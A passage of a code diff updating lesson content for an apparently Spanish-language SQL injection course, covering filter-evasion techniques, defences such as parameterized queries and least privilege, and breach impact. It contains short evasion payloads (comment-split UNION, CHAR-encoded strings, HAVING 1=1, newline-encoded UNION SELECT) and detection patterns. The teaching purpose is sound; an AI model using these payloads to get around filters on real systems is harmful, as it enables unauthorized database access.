+Aunque visualmente la palabra <code>UNION</code> está partida, el motor ignora el comentario y reconstruye la palabra clave. Si el filtro busca la palabra <code>UNION</code> en el texto, no la encontrará debido a la interrupción. Después, el motor interpreta la combinación como una única palabra clave válida.
+</p>
+
+<p>
+Los motores procesan los comentarios antes de interpretar la consulta, lo cual permite que la vulnerabilidad sea explotable, aunque la aplicación haya aplicado filtros superficiales.
+</p>
+
+<h3>Manipulación mediante funciones internas para evitar comparaciones directas</h3>
+
+<p>
+En lugar de escribir valores de manera literal, un atacante puede usar funciones de conversión o transformación que permitan generar valores equivalentes sin introducir el texto prohibido. Por ejemplo, si la aplicación impide el uso de comillas simples, un atacante puede generar cadenas mediante <code>CHAR</code>.
+</p>
+
+<p>
+Una expresión como:
+</p>
+
+<pre><code class="language-html">CHAR(97, 100, 109, 105, 110)</code></pre>
+
+<p>
+genera la palabra <code>admin</code>. El filtro no detecta comillas ni cadenas explícitas. Durante la ejecución, el motor genera la cadena en memoria, lo que permite construir condiciones equivalentes.
+</p>
+
+<p>
+Esta técnica es útil cuando los filtros se enfocan en símbolos como comillas simples o dobles, pero pasan por alto funciones internas del motor que pueden generar cadenas idénticas.
+</p>
+
+<h3>Evasión mediante encadenamiento de consultas parciales</h3>
+
+<p>
+Algunos motores permiten que ciertas partes de la consulta sean opcionales o sustituyentes. Cuando la aplicación bloquea palabras clave específicas pero no todas las variantes posibles, el atacante puede reescribir parte de la lógica.
+</p>
+
+<p>
+Por ejemplo, en lugar de utilizar <code>WHERE</code>, es posible utilizar <code>HAVING</code>. Ambas pueden filtrar resultados bajo ciertas condiciones. Si la aplicación filtra <code>WHERE</code> pero olvida <code>HAVING</code>, un atacante puede enviar una entrada como:
+</p>
+
+<pre><code class="language-htmle">HAVING 1=1</code></pre>
+
+<p>
+Esto reconstruye la misma lógica que <code>WHERE 1=1</code> en ciertos contextos. La evasión funciona porque la aplicación no detecta las posiciones exactas donde <code>HAVING</code> puede actuar como filtro.
+</p>
+
+<h3>Manipulación mediante subconsultas</h3>
+
+<p>
+Si un filtro bloquea palabras clave en posiciones predecibles, un atacante puede ocultarlas dentro de subconsultas. Por ejemplo, si una aplicación bloquea <code>SELECT</code> en el texto enviado por el usuario, el atacante puede intentar evitar la detección mediante una estructura como:
+</p>
+
+<pre><code class="language-html">(SELECT nombre FROM usuarios LIMIT 1)</code></pre>
+
+<p>
+Si la consulta principal no busca <code>SELECT</code> dentro de subconsultas, la expresión pasará el filtro. El motor evaluará la subconsulta y utilizará su resultado dentro de la lógica general.
+</p>
+
+<p>
+Esta técnica aprovecha la capacidad del motor para interpretar múltiples niveles de consultas anidadas.
+</p>
+
+<h3>Evasión mediante espacios alternativos y caracteres invisibles</h3>
+
+<p>
+Algunos motores permiten reemplazar espacios con tabulaciones, saltos de línea o caracteres que no son visibles al usuario. Los filtros más simples solo buscan espacios estándar.
+</p>
+
+<p>
+Expresiones como:
+</p>
+
+<pre><code class="language-html">UNI
+ON SELECT</code></pre>
+
+<pre><code class="language-html">UNION%0ASELECT</code></pre>
+
+<p>
+donde <code>%0A</code> representa un salto de línea codificado, pueden ser interpretadas como consultas válidas. Si el filtro busca secuencias continuas en una única línea, un atacante puede descomponerlas usando saltos o tabulaciones.
+</p>
+
+<p>
+Los motores procesan estos caracteres como separadores válidos, lo cual permite ejecutar la consulta en su forma original.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, SQL Injection Cheatsheet, [Online]. Available:
+    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
+      https://portswigger.net/web-security/sql-injection
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, Microsoft Press.
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
       `
     },
     'prevencion-sqli': {
       id: 'prevencion-sqli',
-      title: 'Prevención de Inyección SQL',
-      description: 'Aprende las defensas efectivas: consultas parametrizadas, uso correcto de ORMs, validación por whitelist y separación de responsabilidades entre código y datos.',
+      title: 'Estrategias de defensa y prevención',
+      description: 'Buenas prácticas para proteger aplicaciones frente a la inyección SQL.',
       category: 'sqli',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Este módulo explica las defensas prácticas y comprobadas contra la inyección SQL. La regla de oro es siempre separar datos y código: nunca construir instrucciones SQL concatenando entrada del usuario.
-          Describiremos las técnicas principales (consultas parametrizadas, procedimientos almacenados bien escritos, validación por lista blanca, uso correcto de ORMs), consideraciones especiales y ejemplos concretos en varios lenguajes.
-        </p>
+La inyección SQL es una de las vulnerabilidades más críticas en aplicaciones web debido a que permite manipular directamente la lógica de consultas y acceder a información confidencial. Para evitar su explotación, es necesario aplicar prácticas de diseño seguro, validación estricta de entradas y mecanismos de consulta que eliminen la posibilidad de que datos proporcionados por el usuario se interpreten como instrucciones SQL. En esta lección se presentan estrategias técnicas que pueden aplicarse desde el diseño del sistema, así como ejemplos de código seguro que ilustran cómo bloquear las vías más comunes de explotación.
+</p>
 
-        <h2>Resumen conceptual</h2>
-        <p>
-          Todas las contramedidas persiguen un objetivo único: asegurar que los valores proporcionados por usuarios no puedan alterar la estructura de una sentencia SQL. Los mecanismos más sólidos logran esto al tratar los valores como literales (no como parte del código SQL).
-        </p>
+<h3>Uso de consultas parametrizadas y sentencias preparadas</h3>
 
-        <h2>1. Consultas parametrizadas (Prepared Statements)</h2>
-        <p>
-          Defensa principal y recomendada. La aplicación envía la estructura de la consulta al motor con marcadores (placeholders) y proporciona los valores por separado. El motor ya conoce la gramática de la consulta antes de ver los valores, por lo que estos nunca cambian la estructura.
-        </p>
+<p>
+Las consultas parametrizadas separan claramente la lógica de la consulta del contenido suministrado por el usuario. En lugar de insertar valores directamente en la cadena SQL, el motor trata los parámetros como datos, sin interpretarlos como instrucciones.
+</p>
 
-        <h3>Ejemplos</h3>
-        <p>PHP (PDO):</p>
-        <pre><code class="language-php">$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
-    $stmt->execute([$u, $p]);</code></pre>
+<p>Un ejemplo en Node.js con MySQL:</p>
 
-        <p>Python (psycopg2):</p>
-        <pre><code class="language-python">cur.execute("SELECT * FROM users WHERE user = %s AND pass = %s", (u, p))</code></pre>
+<pre><code class="language-html highlight-secure">const consulta = "SELECT * FROM usuarios WHERE correo = ?";
+conexion.query(consulta, [req.body.correo], function (err, resultados) {
+    if (err) throw err;
+    res.json(resultados);
+});
+</code></pre>
 
-        <p>C# (.NET):</p>
-        <pre><code class="language-csharp">SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE user = @user AND pass = @pass", conn);
-    cmd.Parameters.AddWithValue("@user", userInput);
-    cmd.Parameters.AddWithValue("@pass", passInput);</code></pre>
+<p>
+En este ejemplo, el signo <code>?</code> representa un marcador de posición. El motor inserta el valor del usuario como un parámetro y nunca lo evalúa como instrucción <code>SQL</code>. Esto protege incluso si el usuario introduce caracteres como comillas o palabras clave manipuladas.
+</p>
 
-        <p><strong>Consideraciones:</strong> Los identificadores (nombres de tabla/columna) no pueden parametrizarse; para esos casos use listas blancas o mapeos seguros.</p>
+<p>
+El comportamiento preventivo radica en que el motor compila primero la consulta y luego inserta los valores, evitando completamente la concatenación directa.
+</p>
 
-        <h2>2. Procedimientos almacenados (Stored Procedures)</h2>
-        <p>
-          Útiles si se diseñan correctamente: los SP son seguros cuando reciben parámetros y no construyen SQL dinámico internamente. Un procedimiento que concatena parámetros para formar SQL dinámico sigue siendo vulnerable.
-        </p>
+<h3>Validación estricta y saneamiento de entradas</h3>
 
-        <h3>Ejemplo vulnerable (no usar):</h3>
-        <pre><code class="language-sql">CREATE PROCEDURE getUsersByCity @city NVARCHAR(50) AS
-    BEGIN
-      DECLARE @query NVARCHAR(MAX);
-      SET @query = 'SELECT * FROM Users WHERE city = ''' + @city + '''';
-      EXEC(@query);
-    END</code></pre>
+<p>
+La validación de entradas busca asegurar que los valores suministrados cumplan con reglas predefinidas. No se basa en bloquear palabras clave, sino en limitar la estructura permitida según el contexto.
+</p>
 
-        <h3>Ejemplo correcto:</h3>
-        <pre><code class="language-sql">CREATE PROCEDURE getUsersByCity @city NVARCHAR(50) AS
-    BEGIN
-      SELECT * FROM Users WHERE city = @city;
-    END</code></pre>
+<p>Un ejemplo en JavaScript:</p>
 
-        <p>
-          <strong>Nota:</strong> puede controlar permisos otorgando a la cuenta de la aplicación permiso únicamente para ejecutar el SP, no para SELECT directo sobre tablas sensibles.
-        </p>
+<pre><code class="language-html highlight-secure">const correo = req.body.correo;
+const patron = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
 
-        <h2>3. Validación por lista blanca (whitelisting)</h2>
-        <p>
-          Validar formato, tipo y rango de los datos entrantes. Rechazar cualquier valor que no cumpla las reglas esperadas. Esto es crítico para datos estructurales que no se parametrizan (p. ej. nombre de columna, modo de ordenación).
-        </p>
+if (!patron.test(correo)) {
+    return res.status(400).send("Formato de correo no válido");
+}
+</code></pre>
 
-        <h3>Patrones prácticos</h3>
-        <ul>
-          <li>Campos numéricos: coerción y rango (parseInt + comprobar límites).</li>
-          <li>Valores enumerados: mapear entrada a un conjunto predefinido (p. ej. sort: {'name':'name','date':'date'}).</li>
-          <li>Identificadores: permitir solo [A-Za-z0-9_]+ y verificar coincidencia con regex.</li>
-          <li>Longitud máxima: limitar tamaño para evitar payloads voluminosos.</li>
-        </ul>
+<p>
+El uso de expresiones regulares limita la entrada a un formato válido. Si un atacante intenta introducir caracteres que puedan alterar una consulta, serán rechazados antes de llegar al motor de base de datos.
+</p>
 
-        <h2>4. Escapado de caracteres (último recurso / capa adicional)</h2>
-        <p>
-          Escapar puede servir como medida adicional cuando no es posible parametrizar (casos raros), pero no debe ser la defensa principal. Use funciones de escape oficiales del driver o bibliotecas probadas; no implemente escapes caseros.
-        </p>
+<p>
+Este método protege la parte superior del flujo de datos, evitando que el usuario envíe parámetros que no deberían aceptarse en primer lugar.
+</p>
 
-        <h2>5. Uso correcto de ORMs y frameworks</h2>
-        <p>
-          Aproveche las abstracciones: ORMs y query builders suelen generar SQL parametrizado. Evite ejecutar SQL crudo a menos que sea necesario; si lo hace, use los mecanismos de parametrización del ORM (named parameters, bind variables).
-        </p>
+<h3>Restricción de privilegios en la base de datos</h3>
 
-        <h3>Buenas prácticas con ORMs</h3>
-        <ul>
-          <li>Favor métodos de filtrado del ORM en vez de concatenar cadenas SQL.</li>
-          <li>Si debe usar SQL crudo, parametrice los valores y valide identificadores.</li>
-          <li>Revise la documentación del ORM sobre consultas dinámicas y seguridad.</li>
-        </ul>
+<p>
+El principio de mínimo privilegio indica que las cuentas utilizadas por la aplicación deben tener únicamente los permisos necesarios. Si una cuenta solo debe realizar consultas, no debe tener permisos para modificar datos ni para ejecutar funciones avanzadas.
+</p>
 
-        <h2>6. Controles en la base de datos y operaciones</h2>
-        <ul>
-          <li><strong>Principio de menor privilegio:</strong> cuentas de aplicación con permisos mínimos.</li>
-          <li><strong>Deshabilitar múltiples statements:</strong> configure drivers para no permitir consultas apiladas si no son necesarias.</li>
-          <li><strong>Auditoría y monitoreo:</strong> alertas por patrones anómalos (UNION, OR 1=1, SLEEP, tiempos inusuales).</li>
-          <li><strong>WAF:</strong> complemento útil para bloquear intentos básicos, pero no sustituto del código seguro.</li>
-        </ul>
+<p>Por ejemplo, al crear el usuario para la aplicación:</p>
 
-        <h2>Ejemplos comparativos: vulnerable vs seguro</h2>
+<pre><code class="language-html highlight-secure">GRANT SELECT, INSERT, UPDATE ON tienda.* TO 'app_user'@'localhost';
+</code></pre>
 
-        <h3>Autenticación (PHP) — Vulnerable</h3>
-        <pre><code class="language-php">$query = "SELECT * FROM users WHERE username = '".$_POST['user']."' AND password = '".$_POST['pass']."'";</code></pre>
+<p>
+Esta cuenta no podría eliminar tablas o modificar estructuras. Si un atacante lograra inyectar una consulta peligrosa, los privilegios limitados impedirían su ejecución.
+</p>
 
-        <h3>Autenticación (PHP) — Seguro (parametrizado)</h3>
-        <pre><code class="language-php">$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
-    $stmt->bind_param("ss", $_POST['user'], $_POST['pass']);
-    $stmt->execute();</code></pre>
+<p>
+El mecanismo se basa en que el motor detiene cualquier instrucción que no esté permitida para el usuario autenticado, aun si la consulta fue manipulada.
+</p>
 
-        <h3>ORDER BY dinámico — Seguro (lista blanca)</h3>
-        <pre><code class="language-java">String orderParam = request.getParameter("order");
-    Map<String,String> allowed = Map.of("price","price","date","date");
-    String orderSql = allowed.get(orderParam);
-    if(orderSql == null) throw new IllegalArgumentException("Orden no válido");
-    String query = "SELECT * FROM Products ORDER BY " + orderSql;</code></pre>
+<h3>Uso de ORM seguros</h3>
 
-        <h3>Nombre de tabla desde usuario — Seguro (lista blanca)</h3>
-        <pre><code class="language-python">table = input()
-    allowed_tables = {"clientes","productos","ventas"}
-    if table not in allowed_tables:
-        raise Exception("Tabla no permitida")
-    cur.execute(f"COPY {table} TO '/tmp/{table}.csv' DELIMITER ',' CSV")</code></pre>
+<p>
+Los ORM proporcionan capas de abstracción que generan consultas sin concatenar cadenas directamente. Aunque no eliminan por completo el riesgo, reducen significativamente la posibilidad de inyección si se utilizan correctamente.
+</p>
 
-        <h2>Errores comunes y cómo evitarlos</h2>
-        <ul>
-          <li>No parametrizar “temporalmente” y olvidar corregir: aplique prácticas seguras desde el inicio.</li>
-          <li>Validación solo en cliente: toda validación crítica debe repetirse en el servidor.</li>
-          <li>Confiar exclusivamente en WAF o stored procedures sin revisar su implementación.</li>
-          <li>Deshabilitar logging de errores críticos o mostrar mensajes de error detallados a usuarios.</li>
-        </ul>
+<p>Ejemplo en Sequelize:</p>
 
-        <h2>Integración en el ciclo de desarrollo</h2>
-        <ul>
-          <li>Incluir reglas de seguridad en code reviews (checklist: ¿parametrizado? ¿validación? ¿identificadores validados?).</li>
-          <li>Automatizar SAST en CI para detectar concatenaciones peligrosas y patrones de inyección.</li>
-          <li>Ejecutar DAST (scans dinámicos) en entornos de staging antes de deploy.</li>
-          <li>Formación continua: plantillas de código seguro y ejemplos en el repositorio interno.</li>
-        </ul>
+<pre><code class="language-html highlight-secure">Usuario.findOne({
+    where: { correo: req.body.correo }
+});
+</code></pre>
 
-        <h2>Resumen</h2>
-        <p>
-          La defensa efectiva contra la inyección SQL se basa en aplicar de forma consistente prepared statements, validar por lista blanca los datos estructurales, usar ORMs correctamente y aplicar principio de menor privilegio en la BD.
-          Complementar con escapes (solo cuando no hay alternativa), monitoreo, y herramientas automatizadas ofrece defensa en profundidad. La corrección en el código fuente debe ser la prioridad: impedir la vulnerabilidad en la raíz es más fiable que depender de mitigaciones externas.
-        </p>
-      `
-    },
-    'arquitectura-operaciones': {
-      id: 'arquitectura-operaciones',
-      title: 'Arquitectura y Operaciones Seguras',
-      description: 'Descubre medidas a nivel de arquitectura y operación: controles de acceso a la BD, monitoreo de consultas, WAF como capa adicional y planes de respuesta ante incidentes.',
-      category: 'sqli',
-      htmlContent: `
-          <h2>Introducción</h2>
-          <p>
-            Este módulo amplía el enfoque desde la codificación segura hacia la arquitectura y la operación. Una arquitectura bien diseñada y una operación vigilante reducen el riesgo y el impacto de la inyección SQL por medio de controles de acceso, segmentación, monitoreo y respuesta.
-          </p>
+<p>
+Aquí, el ORM genera la consulta utilizando parámetros internos, no concatenación. La lógica queda delegada al mecanismo del ORM, que incorpora protección contra inyección en la construcción de sus consultas.
+</p>
 
-          <h2>Diseño por capas y mínimo privilegio</h2>
-          <p>
-            La defensa en profundidad exige que cada capa (presentación, negocio, datos) limite lo que entrega a la siguiente y que todas apliquen el principio de mínimo privilegio.
-          </p>
-          <ul>
-            <li><strong>Cuentas de BD con permisos mínimos:</strong> sin privilegios de administración; acceso sólo a tablas y operaciones necesarias.</li>
-            <li><strong>Separación de servicios:</strong> acceder a la BD a través de APIs/microservicios que validen entradas y aíslen la base.</li>
-            <li><strong>Entornos segregados:</strong> BD en redes internas protegidas por firewall; acceso directo desde internet deshabilitado.</li>
-            <li><strong>Compartimentación/multi-tenancy:</strong> instancias, esquemas o bases separadas para reducir impacto cruzado.</li>
-          </ul>
+<p>
+El beneficio principal reside en que el desarrollador no escribe consultas manuales, reduciendo los puntos donde podrían cometerse errores.
+</p>
 
-          <h2>Abstracciones de datos y tecnologías</h2>
-          <p>
-            <strong>ORMs y query builders:</strong> favorecen SQL parametrizado y tipos estrictos, reduciendo errores al impedir concatenaciones libres.
-            <br />
-            <strong>NoSQL:</strong> no usa SQL pero puede sufrir inyecciones de operadores; validar objetos/operadores y usar ODMs que apliquen controles.
-          </p>
+<h3>Uso de listas blancas para valores controlados</h3>
 
-          <h2>Capas de seguridad adicionales</h2>
-          <ul>
-            <li><strong>WAF:</strong> filtra patrones conocidos de inyección SQL antes de llegar a la aplicación.</li>
-            <li><strong>IDS/IPS:</strong> detecta y/o bloquea comportamientos anómalos a nivel de red y base de datos.</li>
-          </ul>
+<p>
+Cuando un parámetro representa una opción limitada, como un campo de ordenamiento, no debe permitirse que el usuario envíe texto arbitrario. En lugar de ello, se implementa una lista blanca que valide únicamente opciones permitidas.
+</p>
 
-          <h2>Hardening de servidores y base de datos</h2>
-          <ul>
-            <li>Deshabilitar funciones peligrosas (p. ej., ejecución de comandos del SO, llamadas externas) si no se requieren.</li>
-            <li>Restringir errores detallados y banners de versión visibles para usuarios no administradores.</li>
-            <li>Mantener SO, motor de BD y dependencias actualizados; ejecutar sólo servicios necesarios.</li>
-            <li>Configurar drivers para <em>no</em> permitir múltiples sentencias en una sola llamada si no es imprescindible.</li>
-          </ul>
+<p>Ejemplo:</p>
 
-          <h2>Monitoreo y respuesta</h2>
-          <ul>
-            <li><strong>Logs y métricas:</strong> registrar errores SQL, entradas sospechosas y tiempos de respuesta inusuales (p. ej., retrasos por <code>SLEEP</code>).</li>
-            <li><strong>Alertas SIEM:</strong> correlacionar eventos (bloqueos del WAF, errores repetidos) para activar respuesta temprana.</li>
-            <li><strong>Gestión de parches:</strong> aplicar actualizaciones ante CVEs relevantes de BD/ORM/controladores.</li>
-          </ul>
+<pre><code class="language-html highlight-secure">const opcionesOrden = ["nombre", "precio", "fecha"];
+const orden = opcionesOrden.includes(req.query.orden) ? req.query.orden : "nombre";
 
-          <h2>Documentación y estándares</h2>
-          <ul>
-            <li>Estándares claros: “todas las consultas deben ser parametrizadas; ningún SP concatenará SQL dinámico”.</li>
-            <li>Revisiones de arquitectura: definir y auditar roles de BD y superficies de exposición en cada módulo nuevo.</li>
-          </ul>
+const consulta = "SELECT nombre, precio FROM productos ORDER BY " + orden;
+</code></pre>
 
-          <h2>Ejemplos y casos</h2>
-          <h3>Ejemplo 1 — Cuenta de BD con mínimo acceso</h3>
-          <p>
-            Usuario <code>app_user</code> con permisos limitados (SELECT/INSERT/UPDATE según tabla, sin DROP/CREATE). Una inyección SQL que intente <code>DROP</code> fallará por permisos.
-          </p>
+<p>
+Aunque <code>ORDER BY</code> no acepta parámetros en todos los motores, validar que el valor provenga de una lista controlada evita que un atacante introduzca instrucciones.
+</p>
 
-          <h3>Ejemplo 2 — Capa de datos vía procedimientos almacenados</h3>
-          <p>
-            La aplicación sólo puede ejecutar SPs parametrizados (sin SQL dinámico interno) y no tiene SELECT directo sobre tablas sensibles.
-          </p>
+<p>
+Este enfoque funciona porque el valor final siempre pertenece a un conjunto seguro.
+</p>
 
-          <h3>Ejemplo 3 — Arquitectura cliente → API → BD</h3>
-          <p>
-            Validación y parametrización en el API centraliza controles y reduce vectores de inyección SQL.
-          </p>
+<h3>Monitoreo y registro de consultas</h3>
 
-          <h3>Ejemplo 4 — WAF</h3>
-          <p>
-            Bloquea automatizaciones típicas (<code>OR 1=1</code>, <code>UNION SELECT</code>) antes de impactar la aplicación. Complementa al código seguro.
-          </p>
+<p>
+Registrar consultas permite detectar patrones sospechosos como intentos repetidos de manipulación o estructuras poco comunes. Aunque no evita la inyección por sí mismo, permite activar mecanismos de alerta y reforzar la seguridad.
+</p>
+<div class="warning-box">
+<p>Un sistema de registro puede capturar:</p>
 
-          <h3>Ejemplo 5 — Detección por logs</h3>
-          <p>
-            Picos de errores de sintaxis o patrones repetitivos disparan alertas y permiten contención (bloqueo por firewall, revisión de éxito de consultas).
-          </p>
+<ul>
+  <li>Consultas fallidas.</li>
+  <li>Consultas con errores constantes en un mismo parámetro.</li>
+  <li>Parámetros excesivamente largos.</li>
+  <li>Intentos de utilizar operadores o funciones no esperadas.</li>
+</ul>
+</div>
+<p>
+El análisis posterior ayuda a identificar anomalías que pueden indicar un ataque en curso.
+</p>
 
-          <h2>Errores comunes</h2>
-          <ul>
-            <li>Usar cuentas administrativas en la cadena de conexión.</li>
-            <li>Dejar credenciales por defecto o configuraciones inseguras en BD.</li>
-            <li>Abrir accesos “temporales” en producción y olvidarlos.</li>
-            <li>Copiar datos reales a entornos de prueba menos protegidos.</li>
-            <li>Desactivar WAF/logs por rendimiento sin plan alterno.</li>
-          </ul>
+<h3>Empleo de Web Application Firewalls (WAF)</h3>
 
-          <h2>Buenas prácticas operativas</h2>
-          <ul>
-            <li>Diagrama actualizado de arquitectura, flujos, puertos y roles de BD.</li>
-            <li>Revisiones periódicas de permisos/usuarios y configuración de BD.</li>
-            <li>Pruebas de penetración integrales (aplicación, red, BD, evasión de WAF).</li>
-            <li>Plan de respuesta a incidentes: rotación de credenciales, contención, comunicación y forense.</li>
-            <li>Security by Design en cada cambio arquitectónico; modelado de amenazas.</li>
-            <li>Simplicidad cuando sea viable: menos caminos → menor superficie de ataque.</li>
-          </ul>
+<p>
+Los WAF actúan como una barrera adicional entre la aplicación y el atacante. Aunque no sustituyen un diseño seguro, pueden detectar patrones comunes de inyección.
+</p>
+<div class="warning-box">
+<p>
+Los WAF analizan las solicitudes entrantes y pueden bloquear aquellas que incluyan:
+</p>
 
-          <h2>Resumen</h2>
-          <p>
-            La mitigación de la inyección SQL requiere un enfoque holístico: mínimo privilegio, segmentación, WAF/IDS/monitoreo, hardening y procesos operativos maduros. Si una capa falla, otras deben limitar el daño. Integrar estas medidas con la codificación segura reduce drásticamente la probabilidad y el impacto de un incidente.
-          </p>
+<ul>
+  <li>Palabras clave fuera de contexto.</li>
+  <li>Estructuras que coinciden con payloads conocidos.</li>
+  <li>Codificaciones sospechosas.</li>
+  <li>Manipulación de parámetros repetitiva.</li>
+</ul>
+</div>
+<p>
+La protección es complementaria y resulta especialmente útil cuando la aplicación aún no implementa todas las medidas internas necesarias.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, Web Security Academy, Preventing SQL Injection, [Online]. Available:
+    <a href="https://portswigger.net/web-security/sql-injection/prevention" target="_blank">
+      https://portswigger.net/web-security/sql-injection/prevention
+    </a>
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
         `
       },
-    'analisis-priorizacion-riesgo': {
-      id: 'analisis-priorizacion-riesgo',
-      title: 'Análisis y Priorización de Riesgos',
-      description: 'Aprende a evaluar severidad según datos expuestos, privilegios y exposición pública, y a priorizar correcciones basadas en impacto y probabilidad.',
+    'impacto-sqli': {
+      id: 'impacto-sqli',
+      title: 'Impacto y consecuencias de la inyección SQL',
+      description: 'Efectos y daños derivados de ataques exitosos de inyección SQL.',
       category: 'sqli',
       htmlContent: `
-          <h2>Introducción</h2>
-          <p>
-            No todas las vulnerabilidades son iguales ni tienen el mismo impacto. En este módulo aprenderemos a analizar el riesgo asociado a las inyecciones SQL y a priorizar las acciones necesarias para gestionarlas. Esto incluye comprender la probabilidad de que una vulnerabilidad sea explotada y el impacto potencial que podría tener sobre la organización.
-          </p>
-          <p>
-            Abordaremos metodologías para calificar riesgos (como <strong>CVSS</strong> y <strong>OWASP Risk Rating</strong>), además de los factores clave a considerar: ¿Qué datos podrían extraerse? ¿Qué tan fácil es explotarla? ¿Qué controles existen que podrían mitigarla?
-          </p>
-          <p>
-            Asimismo, veremos cómo encuadrar las SQLi dentro del panorama general de seguridad (por ejemplo, en el <strong>OWASP Top 10</strong>) y cómo comunicarlas a nivel gerencial para asegurar los recursos necesarios para su corrección. Finalmente, discutiremos cómo priorizar la remediación frente a otros problemas de seguridad o funcionales, basándonos en un análisis costo-beneficio y en el concepto de <em>nivel de riesgo aceptable</em>.
-          </p>
+         <p>
+La inyección SQL representa una de las amenazas más serias para las aplicaciones web debido a que permite que un atacante interactúe directamente con la base de datos. Cuando una explotación es exitosa, el impacto puede extenderse mucho más allá de la simple lectura de información. Los efectos abarcan daños operativos, violaciones de privacidad, interrupciones de servicio, pérdida de confianza y repercusiones legales significativas. Esta lección analiza las consecuencias más relevantes que una organización puede enfrentar, utilizando ejemplos reales para ilustrar cómo se desarrollan estos incidentes y por qué sus efectos suelen ser tan severos.
+</p>
 
-          <h2>Explicación</h2>
+<h3>Exposición de información sensible</h3>
 
-          <h3>Entendiendo el Riesgo = Probabilidad × Impacto</h3>
-          <p>Esta es la fórmula básica de la gestión de riesgos.</p>
-          <ul>
-            <li><strong>Probabilidad (Likelihood):</strong> depende de factores como la facilidad de descubrimiento (por ejemplo, si la vulnerabilidad se encuentra en una página pública o detrás de autenticación), la existencia de exploits conocidos o herramientas automatizadas (como <em>sqlmap</em>), y la necesidad o no de autenticación. También influye la exposición: una SQLi en una intranet accesible solo para empleados tiene una probabilidad menor de ser explotada por externos, pero aún puede ser aprovechada por amenazas internas.</li>
-            <li><strong>Impacto:</strong> mide qué puede conseguir un atacante si explota la vulnerabilidad. Puede ir desde la lectura de datos no sensibles (impacto bajo) hasta el robo de información confidencial, obtención de credenciales de administrador o incluso la destrucción de la base de datos (impacto crítico).</li>
-          </ul>
-          <p>
-            El impacto se evalúa en tres dimensiones:
-            <ul>
-              <li><strong>Confidencialidad:</strong> datos expuestos o filtrados.</li>
-              <li><strong>Integridad:</strong> alteración o eliminación de registros.</li>
-              <li><strong>Disponibilidad:</strong> interrupción del servicio o caída del sistema.</li>
-            </ul>
-          </p>
-          <p>Por ejemplo, una SQLi que permita ejecutar <code>DROP TABLE</code> tiene un impacto alto en integridad y disponibilidad, mientras que una que solo lea datos no sensibles afecta moderadamente la confidencialidad.</p>
+<p>
+Una de las consecuencias más frecuentes de la inyección SQL es la obtención no autorizada de datos almacenados en la base. Cuando la aplicación concatena parámetros sin validación, el atacante puede manipular la consulta para devolver información a la que normalmente no tendría acceso.
+</p>
 
-          <h3>Evaluación con CVSS</h3>
-          <p>
-            El <strong>Common Vulnerability Scoring System (CVSS)</strong> proporciona un marco estandarizado para puntuar vulnerabilidades. Una SQLi explotable remotamente suele tener:
-          </p>
-          <ul>
-            <li>Attack Vector: <strong>Network</strong></li>
-            <li>Attack Complexity: <strong>Low</strong></li>
-            <li>Privileges Required: <strong>None</strong></li>
-            <li>User Interaction: <strong>None</strong></li>
-          </ul>
-          <p>Si además compromete confidencialidad, integridad y disponibilidad, su puntaje final suele ser <strong>9.0 o superior (crítico)</strong>. De hecho, la mayoría de las CVE relacionadas con SQLi se califican entre <strong>7.5 y 10.0</strong>.</p>
+<p>
+Esta exposición afecta tanto datos personales como credenciales internas, historiales de transacciones y cualquier información que la cuenta utilizada por la aplicación tenga permiso de consultar. El daño se vuelve mayor cuando los usuarios confían en la organización para proteger datos altamente sensibles.
+</p>
 
-          <h3>OWASP Top 10 y contexto</h3>
-          <p>
-            OWASP ha clasificado las <strong>inyecciones</strong> entre las principales amenazas desde hace más de una década. En el Top 10 de 2017 ocupaban el puesto #1, y en el de 2021 el #3, lo que demuestra su persistencia y gravedad.
-          </p>
-          <p>
-            Las razones son claras:
-            <ul>
-              <li>Son <strong>fáciles de explotar</strong> (cualquier atacante con herramientas básicas puede intentarlo).</li>
-              <li>Sus <strong>consecuencias son severas</strong> (filtración masiva de datos, pérdida de integridad o control total del sistema).</li>
-            </ul>
-          </p>
-          <p>Casos emblemáticos como <strong>Equifax (2017)</strong> o <strong>Yahoo (2014)</strong> demuestran que una inyección mal gestionada puede causar pérdidas económicas y reputacionales catastróficas.</p>
+<p>
+Un incidente relevante fue el ocurrido en TalkTalk, proveedor de telecomunicaciones en Reino Unido. La compañía mantenía un módulo heredado vulnerable a inyección SQL. Los atacantes enviaron consultas manipuladas para extraer información personal de más de ciento cincuenta mil clientes. Aunque los datos obtenidos no incluían números completos de tarjetas, sí comprometían direcciones, nombres, fechas de nacimiento y otra información susceptible de usarse para fraude y suplantación de identidad. La empresa, además de enfrentar una multa considerable por incumplir normas de protección de datos, experimentó una pérdida significativa de clientes en los meses posteriores.
+</p>
 
-          <h3>Análisis de escenarios específicos</h3>
-          <ul>
